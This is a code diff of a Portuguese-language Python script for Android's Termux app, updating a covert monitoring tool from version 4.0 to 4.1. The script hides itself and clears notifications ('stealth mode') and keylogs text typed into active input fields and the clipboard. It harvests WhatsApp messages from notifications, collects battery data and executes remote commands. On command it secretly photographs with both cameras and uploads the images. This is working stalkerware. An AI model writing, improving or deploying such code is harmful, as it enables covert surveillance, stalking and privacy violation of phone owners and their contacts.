@@ -32,10 +32,7 @@ DEVICE_ID = obter_id()
 # MODO STEALTH
 # ============================================
 def ativar_stealth():
-    """Esconde o Termux e roda em segundo plano"""
-    # Minimiza o Termux
     run("am start -a android.intent.action.MAIN -c android.intent.category.HOME", timeout=3)
-    # Remove notificação persistente do Termux (se possível)
     run("termux-notification-remove --all", timeout=2)
     print("🥷 Modo Stealth ATIVADO\n")
 
@@ -43,8 +40,6 @@ print("\n" + "="*50)
 print(f"🛰️  MOTOR NEXOS DUAL STREAM CARD OPERACIONAL")
 print(f"🔑  SEU MONITOR ID DE PROD: {DEVICE_ID}")
 print("="*50)
-
-# Ativa stealth automaticamente ao iniciar
 ativar_stealth()
 
 ultima_lat = -16.6869
@@ -92,16 +87,27 @@ def obter_app_aberto():
     return "outro"
 
 def obter_texto_digitado():
-    texto = ""
-    clip = run("termux-clipboard-get", timeout=2)
-    if clip and len(clip) > 0:
-        texto = clip[:200]
-    input_text = run("dumpsys input_method | grep -A5 'mCur' | grep 'text=' | head -1", timeout=2)
-    if input_text and "text=" in input_text:
+    """Captura texto que está sendo digitado no campo de texto ATIVO"""
+    # Método 1: Pegar do input method (campo de texto focado)
+    result = run("dumpsys input_method | grep -oP 'mComposingText=\K[^ ]*' | head -1", timeout=2)
+    if result and len(result) > 1:
+        return result[:200]
+    
+    # Método 2: Pegar texto do campo ativo via dumpsys
+    result = run("dumpsys input_method | grep -E 'mCur.*text=' | head -1", timeout=2)
+    if result and "text=" in result:
         try:
-            texto = input_text.split("text=")[1].split(",")[0][:200]
+            texto = result.split("text=")[1].split(",")[0]
+            if len(texto) > 1:
+                return texto[:200]
         except: pass
-    return texto if texto else None
+    
+    # Método 3: Clipboard (fallback)
+    clip = run("termux-clipboard-get", timeout=2)
+    if clip and len(clip) > 0 and len(clip) < 500:
+        return clip[:200]
+    
+    return None
 
 def obter_whatsapp():
     global ultimo_whatsapp, historico_msg, msg_processadas
@@ -114,77 +120,42 @@ def obter_whatsapp():
         try:
             dados = json.loads(notif)
             novas_msgs = False
-            
             for n in dados:
                 pkg = n.get("packageName", "")
                 if "whatsapp" in pkg.lower():
                     pessoa = n.get("title", "WhatsApp")[:30]
                     texto = n.get("content", "")
                     msg_id = n.get("key", "") or f"{pessoa}_{texto[:50]}_{n.get('when','')}"
-                    
-                    if msg_id in msg_processadas:
-                        continue
-                    
+                    if msg_id in msg_processadas: continue
                     msg_processadas.add(msg_id)
                     novas_msgs = True
+                    if len(msg_processadas) > 500: msg_processadas.clear()
                     
-                    if len(msg_processadas) > 500:
-                        msg_processadas.clear()
+                    tem_midia = False; tipo_midia = ""
+                    if any(x in texto.lower() for x in ["📷", "photo", "imagem"]): tem_midia = True; tipo_midia = "📷 Foto"
+                    elif any(x in texto.lower() for x in ["🎥", "video", "vídeo"]): tem_midia = True; tipo_midia = "🎥 Vídeo"
+                    elif any(x in texto.lower() for x in ["🎵", "audio", "áudio"]): tem_midia = True; tipo_midia = "🎵 Áudio"
+                    elif any(x in texto.lower() for x in ["📎", "documento", "arquivo"]): tem_midia = True; tipo_midia = "📎 Arquivo"
+                    elif any(x in texto.lower() for x in ["figurinha", "sticker"]): tem_midia = True; tipo_midia = "😄 Figurinha"
                     
-                    # Detecta mídia
-                    tem_midia = False
-                    tipo_midia = ""
-                    if any(x in texto.lower() for x in ["📷", "photo", "imagem"]):
-                        tem_midia = True; tipo_midia = "📷 Foto"
-                    elif any(x in texto.lower() for x in ["🎥", "video", "vídeo"]):
-                        tem_midia = True; tipo_midia = "🎥 Vídeo"
-                    elif any(x in texto.lower() for x in ["🎵", "audio", "áudio"]):
-                        tem_midia = True; tipo_midia = "🎵 Áudio"
-                    elif any(x in texto.lower() for x in ["📎", "documento", "arquivo"]):
-                        tem_midia = True; tipo_midia = "📎 Arquivo"
-                    elif any(x in texto.lower() for x in ["figurinha", "sticker"]):
-                        tem_midia = True; tipo_midia = "😄 Figurinha"
-                    
-                    if tem_midia and not texto:
-                        texto = tipo_midia
-                    elif tem_midia:
-                        texto = f"{tipo_midia}: {texto}"
+                    if tem_midia and not texto: texto = tipo_midia
+                    elif tem_midia: texto = f"{tipo_midia}: {texto}"
                     
                     if pessoa not in historico_msg:
-                        historico_msg[pessoa] = {
-                            "pessoa": pessoa,
-                            "mensagens": [],
-                            "ultima_msg": "",
-                            "total": 0,
-                            "midia": False
-                        }
-                    
-                    historico_msg[pessoa]["mensagens"].append({
-                        "texto": texto[:150] if texto else "(sem texto)",
-                        "midia": tem_midia,
-                        "hora": datetime.now().strftime("%H:%M"),
-                        "tipo": "recebida"
-                    })
-                    
-                    if len(historico_msg[pessoa]["mensagens"]) > 30:
-                        historico_msg[pessoa]["mensagens"] = historico_msg[pessoa]["mensagens"][-30:]
-                    
+                        historico_msg[pessoa] = {"pessoa": pessoa, "mensagens": [], "ultima_msg": "", "total": 0, "midia": False}
+                    historico_msg[pessoa]["mensagens"].append({"texto": texto[:150] if texto else "(sem texto)", "midia": tem_midia, "hora": datetime.now().strftime("%H:%M"), "tipo": "recebida"})
+                    if len(historico_msg[pessoa]["mensagens"]) > 30: historico_msg[pessoa]["mensagens"] = historico_msg[pessoa]["mensagens"][-30:]
                     historico_msg[pessoa]["ultima_msg"] = texto[:80]
                     historico_msg[pessoa]["total"] = len(historico_msg[pessoa]["mensagens"])
                     historico_msg[pessoa]["midia"] = tem_midia
             
-            if novas_msgs:
-                run("termux-notification-remove --all", timeout=3)
-            
+            if novas_msgs: run("termux-notification-remove --all", timeout=3)
             ultimo_whatsapp = agora
-        except:
-            pass
-    
+        except: pass
     return list(historico_msg.values())
 
 def obter_keylog():
-    """Keylogger + Captura de texto enviado"""
-    global ultimo_keylog
+    global ultimo_keylog, historico_msg
     agora = time.time()
     if agora - ultimo_keylog < 3:
         return None
@@ -192,42 +163,28 @@ def obter_keylog():
     app = obter_app_aberto()
     texto = obter_texto_digitado()
     
-    if app in ["whatsapp", "instagram"] or texto:
+    if app in ["whatsapp", "instagram"] and texto:
         ultimo_keylog = agora
         
-        # Se tem texto capturado E WhatsApp aberto, é msg ENVIADA
-        tipo = "enviada" if (texto and app in ["whatsapp", "instagram"]) else "digitando"
+        # Adiciona como mensagem ENVIADA na conversa
+        destino = "Conversa"  # Nome genérico
+        if destino not in historico_msg:
+            historico_msg[destino] = {"pessoa": destino, "mensagens": [], "ultima_msg": "", "total": 0, "midia": False}
         
-        # Adiciona ao histórico como mensagem enviada
-        if texto and app == "whatsapp":
-            # Tenta descobrir pra quem foi enviada (pelo contexto)
-            destino = "Conversa"
-            for pessoa in historico_msg:
-                if historico_msg[pessoa]["ultima_msg"] and any(p in texto for p in ["ok", "sim", "não"]):
-                    destino = pessoa
-                    break
-            
-            if destino not in historico_msg:
-                historico_msg[destino] = {
-                    "pessoa": destino, "mensagens": [], "ultima_msg": "", "total": 0, "midia": False
-                }
-            
+        # Verifica se não é duplicata
+        if not historico_msg[destino]["mensagens"] or historico_msg[destino]["mensagens"][-1]["texto"] != texto[:150]:
             historico_msg[destino]["mensagens"].append({
                 "texto": texto[:150],
                 "midia": False,
                 "hora": datetime.now().strftime("%H:%M"),
                 "tipo": "enviada"
             })
-            historico_msg[destino]["ultima_msg"] = texto[:80]
+            if len(historico_msg[destino]["mensagens"]) > 30:
+                historico_msg[destino]["mensagens"] = historico_msg[destino]["mensagens"][-30:]
+            historico_msg[destino]["ultima_msg"] = f"📤 {texto[:80]}"
             historico_msg[destino]["total"] = len(historico_msg[destino]["mensagens"])
         
-        return {
-            "app": app,
-            "ativo": True,
-            "texto": texto or "",
-            "tipo": tipo,
-            "timestamp": datetime.now().strftime("%H:%M:%S")
-        }
+        return {"app": app, "ativo": True, "texto": texto[:200], "tipo": "enviada", "timestamp": datetime.now().strftime("%H:%M:%S")}
     
     ultimo_keylog = agora
     return None
@@ -235,10 +192,7 @@ def obter_keylog():
 def executar_comando(acao):
     if acao == "vibrar": run("termux-vibrate -d 1000", timeout=3)
     elif acao == "som": run("termux-media-player play scan", timeout=3)
-    elif acao == "lanterna":
-        run("termux-torch on", timeout=3)
-        time.sleep(2)
-        run("termux-torch off", timeout=3)
+    elif acao == "lanterna": run("termux-torch on", timeout=3); time.sleep(2); run("termux-torch off", timeout=3)
     elif acao == "stealth": ativar_stealth()
 
 def enviar_dados(payload):
@@ -265,7 +219,7 @@ def enviar_lote(front_b64, back_b64):
         return r.status_code == 200
     except: return False
 
-print("🛰️  INICIADO v4.0 (Stealth + Msgs Enviadas)\n")
+print("🛰️  INICIADO v4.1 (Keylogger input field + WhatsApp cards)\n")
 
 while True:
     t0 = time.time()
@@ -294,34 +248,28 @@ while True:
     
     resp = enviar_dados(payload)
     dt = time.time() - t0
-    icone = "📍" if gps_ok else "📡"
     
     if resp and resp.get("status") == "success":
         cmd_cam = resp.get("comando_cam", "wait")
         cmd_remoto = resp.get("comando_remoto", "none")
         
-        # Terminal minimalista (modo stealth)
-        status = f"🥷 {icone} [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% {rede}"
-        if keylog and keylog.get("texto"):
-            status += f" | ⌨️{keylog.get('tipo','?')}:{keylog['texto'][:30]}"
-        if msgs_whats:
-            status += f" | 💬{len(msgs_whats)}"
-        print(status + f" | {dt:.1f}s")
+        # Terminal enxuto
+        partes = [f"🥷 {datetime.now().strftime('%H:%M:%S')} Bat:{bat}% {rede}"]
+        if keylog and keylog.get("texto"): partes.append(f"⌨️{keylog['texto'][:25]}")
+        if msgs_whats: partes.append(f"💬{len(msgs_whats)}")
+        print(" | ".join(partes) + f" | {dt:.1f}s")
         
         if cmd_remoto != "none": executar_comando(cmd_remoto)
         
         if cmd_cam == "take_dual":
-            print("📸 [DUAL] Capturando...")
             arq_tras = os.path.expanduser("~/nexos_back.jpg")
             arq_front = os.path.expanduser("~/nexos_front.jpg")
             b64_tras = capturar_foto(0, arq_tras)
             time.sleep(0.3)
             b64_front = capturar_foto(1, arq_front)
             if b64_tras or b64_front:
-                print("   📤 LOTE..." + ("✅" if enviar_lote(b64_front, b64_tras) else "❌"))
+                enviar_lote(b64_front, b64_tras)
             for a in [arq_tras, arq_front]:
                 if os.path.exists(a): os.remove(a)
-    else:
-        print(f"📡 [{datetime.now().strftime('%H:%M:%S')}] Offline | {dt:.1f}s")
     
     time.sleep(2.0)
